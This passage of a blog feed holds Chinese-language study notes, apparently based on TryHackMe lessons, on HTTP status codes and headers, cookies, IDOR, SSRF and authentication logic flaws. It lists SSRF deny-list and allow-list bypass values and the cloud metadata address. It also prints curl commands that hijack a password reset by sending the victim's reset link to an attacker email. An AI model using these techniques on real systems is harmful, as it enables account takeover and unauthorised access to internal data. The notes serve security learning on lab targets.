          &lt;td&gt;&lt;strong&gt;200-299 - 成功&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;此状态代码范围用于告诉客户端其请求成功。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;300-399 - 重定向&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;400-499 - Client Errors 400-499 - 客户端错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;用于通知客户端其请求有错误。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;500-599 - 服务器错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;常见的-http-状态代码&#34;&gt;常见的 HTTP 状态代码：
&lt;/h2&gt;&lt;p&gt;有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;200 - OK 200 - 正常&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;请求已成功完成。&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;201 - Created 201 - 已创建&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;已创建资源（例如，新用户或新博客文章）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;301 - Moved Permanently 301 - 永久移动&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;302 - Found 302 - 找到&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;400 - Bad Request 400 - 错误请求&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;401 - Not Authorised 401 - 未授权&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;403 - Forbidden 403 - 禁止&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;无论您是否登录，您都无权查看此资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;405 - Method Not Allowed 405 - 不允许使用&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;404 - Page Not Found 404 - 未找到页面&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;您请求的页面/资源不存在。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;500 - Internal Service Error 500 - 内部服务错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;服务器在您的请求中遇到了某种错误，它不知道如何正确处理。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;503 - Service Unavailable 503 - 服务不可用&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;此服务器无法处理您的请求，因为它已过载或停机进行维护。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;headers-头&#34;&gt;Headers 头
&lt;/h2&gt;&lt;p&gt;标头是您在发出请求时可以发送到 Web 服务器的附加数据位。&lt;/p&gt;
&lt;p&gt;尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。&lt;/p&gt;
&lt;h3 id=&#34;通用请求标头&#34;&gt;通用请求标头
&lt;/h3&gt;&lt;p&gt;这些是从客户端（通常是您的浏览器）发送到服务器的标头。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。&lt;/p&gt;
&lt;p&gt;**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。&lt;/p&gt;
&lt;p&gt;**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。&lt;/p&gt;
&lt;p&gt;**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。&lt;/p&gt;
&lt;p&gt;**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。&lt;/p&gt;
&lt;h3 id=&#34;常见响应标头&#34;&gt;常见响应标头
&lt;/h3&gt;&lt;p&gt;这些是在请求后从服务器返回给客户端的标头。&lt;/p&gt;
&lt;p&gt;**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。&lt;/p&gt;
&lt;p&gt;**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Type:&lt;/strong&gt; 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。&lt;/p&gt;
&lt;p&gt;**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。&lt;/p&gt;
&lt;h2 id=&#34;cookies&#34;&gt;Cookies
&lt;/h2&gt;&lt;p&gt;它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319090916336.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;Cookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。&lt;/p&gt;
&lt;h3 id=&#34;查看您的-cookie&#34;&gt;查看您的 Cookie
&lt;/h3&gt;&lt;p&gt;您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 Cookie。&lt;/p&gt;
&lt;p&gt;打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 Cookie。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>IDOR基础</title>
        <link>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png" alt="Featured image of post IDOR基础" /&gt;&lt;h1 id=&#34;idor基础&#34;&gt;IDOR基础
&lt;/h1&gt;&lt;h2 id=&#34;什么是idor&#34;&gt;什么是IDOR
&lt;/h2&gt;&lt;p&gt;IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。&lt;/p&gt;
&lt;p&gt;当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例
&lt;/h2&gt;&lt;p&gt;假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 &lt;a class=&#34;link&#34; href=&#34;http://online-service.thm/profile?user_id=1305&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://online-service.thm/profile?user_id=1305&lt;/a&gt;，您可以看到您的信息。&lt;/p&gt;
&lt;p&gt;好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。&lt;/p&gt;
&lt;h2 id=&#34;在编码中发现idor&#34;&gt;在编码中发现IDOR
&lt;/h2&gt;&lt;p&gt;当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 &lt;code&gt;a-z、A-Z、0-9 和 = &lt;/code&gt;字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like &lt;a class=&#34;link&#34; href=&#34;https://www.base64decode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.base64decode.org/&lt;/a&gt; 解码字符串，然后编辑数据并使用 &lt;a class=&#34;link&#34; href=&#34;https://www.base64encode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.base64encode.org/&lt;/a&gt; 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。&lt;/p&gt;
&lt;p&gt;请参阅下图作为此过程的图形示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319134915800.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;哈希idor&#34;&gt;哈希IDOR
&lt;/h2&gt;&lt;p&gt;散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。&lt;/p&gt;
&lt;p&gt;值得将任何发现的哈希值通过 Web 服务，例如 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://crackstation.net/&lt;/a&gt;（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。&lt;/p&gt;
&lt;h2 id=&#34;unpredictable-ids&#34;&gt;Unpredictable IDs
&lt;/h2&gt;&lt;p&gt;如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。&lt;/p&gt;
&lt;h2 id=&#34;idor在哪里&#34;&gt;IDOR在哪里
&lt;/h2&gt;&lt;p&gt;您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。&lt;/p&gt;
&lt;p&gt;有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 &lt;strong&gt;/user/details&lt;/strong&gt; 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 &lt;strong&gt;user_id&lt;/strong&gt; 的参数，您可以使用它来显示其他用户的信息，例如 &lt;strong&gt;/user/details？user_id=123&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SSRF基础</title>
        <link>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png" alt="Featured image of post SSRF基础" /&gt;&lt;h1 id=&#34;ssrf基础&#34;&gt;SSRF基础
&lt;/h1&gt;&lt;h2 id=&#34;什么是ssrf&#34;&gt;什么是SSRF
&lt;/h2&gt;&lt;p&gt;SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。&lt;/p&gt;
&lt;h2 id=&#34;ssrf-的类型&#34;&gt;SSRF 的类型
&lt;/h2&gt;&lt;p&gt;SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。&lt;/p&gt;
&lt;h2 id=&#34;影响是什么&#34;&gt;影响是什么？
&lt;/h2&gt;&lt;p&gt;成功的 SSRF 攻击可能导致以下任何情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进入未经授权的区域。&lt;/li&gt;
&lt;li&gt;访问客户/组织数据。&lt;/li&gt;
&lt;li&gt;能够扩展到内部网络。&lt;/li&gt;
&lt;li&gt;显示身份验证令牌/凭据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;查找ssrf漏洞&#34;&gt;查找SSRF漏洞
&lt;/h2&gt;&lt;p&gt;可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当地址栏的参数中使用完整 URL 时：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153429518.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表单中的隐藏字段：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153443076.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;部分 URL，例如主机名：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153458456.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者可能只是 URL 的路径：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153510906.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。&lt;/p&gt;
&lt;p&gt;如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。&lt;/p&gt;
&lt;h2 id=&#34;常见的防御手段与应对&#34;&gt;常见的防御手段与应对
&lt;/h2&gt;&lt;p&gt;更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。&lt;/p&gt;
&lt;h3 id=&#34;拒绝列表&#34;&gt;拒绝列表
&lt;/h3&gt;&lt;p&gt;在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127.&lt;em&gt;.&lt;/em&gt;.*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。&lt;/p&gt;
&lt;p&gt;此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。&lt;/p&gt;
&lt;h3 id=&#34;允许列表&#34;&gt;允许列表
&lt;/h3&gt;&lt;p&gt;在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 &lt;a class=&#34;link&#34; href=&#34;https://website.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://website.thm&lt;/a&gt; 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 &lt;a class=&#34;link&#34; href=&#34;https://website.thm.attackers-domain.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://website.thm.attackers-domain.thm&lt;/a&gt;）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。&lt;/p&gt;
&lt;h3 id=&#34;打开重定向&#34;&gt;打开重定向
&lt;/h3&gt;&lt;p&gt;如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>身份验证绕过</title>
        <link>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png" alt="Featured image of post 身份验证绕过" /&gt;&lt;h1 id=&#34;身份验证绕过&#34;&gt;身份验证绕过
&lt;/h1&gt;&lt;h2 id=&#34;用户名枚举&#34;&gt;用户名枚举
&lt;/h2&gt;&lt;h2 id=&#34;暴力&#34;&gt;暴力
&lt;/h2&gt;&lt;h2 id=&#34;逻辑缺陷&#34;&gt;逻辑缺陷
&lt;/h2&gt;&lt;h3 id=&#34;什么是逻辑缺陷&#34;&gt;什么是逻辑缺陷？
&lt;/h3&gt;&lt;p&gt;有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319103332643.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;逻辑缺陷示例&#34;&gt;逻辑缺陷示例
&lt;/h3&gt;&lt;p&gt;下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if( url.substr(0,6) === &amp;#39;/admin&amp;#39;) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # Code to check user is an admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;} else {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # View Page
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 &lt;strong&gt;/adMin&lt;/strong&gt; 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。&lt;/p&gt;
&lt;h3 id=&#34;逻辑缺陷实用&#34;&gt;逻辑缺陷实用
&lt;/h3&gt;&lt;p&gt;我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息&lt;strong&gt;Account not found from provided email address&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;出于演示目的，我们将使用 email address &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:robert@acmeitsupport.thm&#34; &gt;robert@acmeitsupport.thm&lt;/a&gt;&lt;/strong&gt;被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:robert@acmeitsupport.thm&#34; &gt;robert@acmeitsupport.thm&lt;/a&gt;&lt;/strong&gt;发送一封密码重置电子邮件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319105628978.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。&lt;/p&gt;
&lt;p&gt;在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。&lt;/p&gt;
&lt;p&gt;让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。&lt;/p&gt;
&lt;p&gt;在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 &lt;code&gt;$_REQUEST&lt;/code&gt; 中的数据发送密码重置电子邮件。&lt;/p&gt;
&lt;p&gt;PHP&lt;code&gt;$_REQUEST&lt;/code&gt; 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;amp;email=attacker@hacker.com&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319110039108.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;**下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 &lt;code&gt;{username}&lt;/code&gt;@customer.acmeitsupport.thm&lt;/p&gt;
&lt;p&gt;现在重新运行 &lt;strong&gt;Curl 请求 2&lt;/strong&gt;，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme:~$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;amp;email={username}@customer.acmeitsupport.thm&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
